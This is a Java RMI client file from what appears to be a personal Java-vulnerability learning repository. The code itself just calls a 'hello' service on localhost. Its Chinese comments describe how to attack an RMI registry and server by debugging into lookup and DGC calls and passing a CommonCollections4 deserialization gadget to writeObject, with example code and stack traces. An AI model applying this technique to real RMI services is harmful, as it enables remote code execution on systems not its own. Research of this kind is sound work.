package com.threedr3am.bug.rmi.client;

import com.threedr3am.bug.rmi.server.service.HelloService;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author threedr3am
 */
public class RMIClient {

  public static void main(String[] args) {
    try {
      Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
      HelloService helloService = (HelloService) registry.lookup("hello");
      /**
       * todo lookup打registry
       * 在不了解通讯协议的情况下，想要通过客户端执行lookup打registry，可以先把payload生成类和相关依赖打包成jar包，
       * 或者一个class目录，通过jvm启动参数追加其到bootclasspath（因为在stub内，当前类加载器是bootstrap加载器，没办法加载到classpath路径的类）
       * -Xbootclasspath/a:/Users/xuanyonghao/security/java/my-project/learnjavabug/rmi/target/rmi-1.0-SNAPSHOT-jar-with-dependencies.jar
       * 然后debug到
       *
       * lookup:115, RegistryImpl_Stub (sun.rmi.registry)
       * main:17, RMIClient (com.threedr3am.bug.rmi.client)
       *
       * 直接debug模式下调用writeObject，参数换成我们的恶意payload
       * 例：
       * Class c = ClassLoader.getSystemClassLoader().loadClass("com/threedr3am/bug/rmi/CommonCollections4".replace("/","."));
       * Method method = c.getMethods()[0];
       * Object o = method.invoke(null,null);
       * var3.writeObject(o);
       *
      * */


      /**
       * todo 客户端打服务端，也是按照上述类似，debug到lookup取到registry返回的stub后，使用dgcclient和服务端连接上
       *
       * dirty:105, DGCImpl_Stub (sun.rmi.transport)
       * makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport)
       * registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport)
       * registerRefs:160, DGCClient (sun.rmi.transport)
       * registerRefs:102, ConnectionInputStream (sun.rmi.transport)
       * releaseInputStream:157, StreamRemoteCall (sun.rmi.transport)
       * done:320, StreamRemoteCall (sun.rmi.transport)
       * done:447, UnicastRef (sun.rmi.server)
       * lookup:129, RegistryImpl_Stub (sun.rmi.registry)
       * main:17, RMIClient (com.threedr3am.bug.rmi.client)
       *
       * Class c = ClassLoader.getSystemClassLoader().loadClass("com/threedr3am/bug/rmi/CommonCollections4".replace("/","."));
       * Method method = c.getMethods()[0];
       * Object o = method.invoke(null,null);
       * var6.getOutputStream().writeObject(o);
       * */
      System.out.println(helloService.sayHello());
    } catch (RemoteException e) {
      e.printStackTrace();
    } catch (NotBoundException e) {
      e.printStackTrace();
    }
  }
}
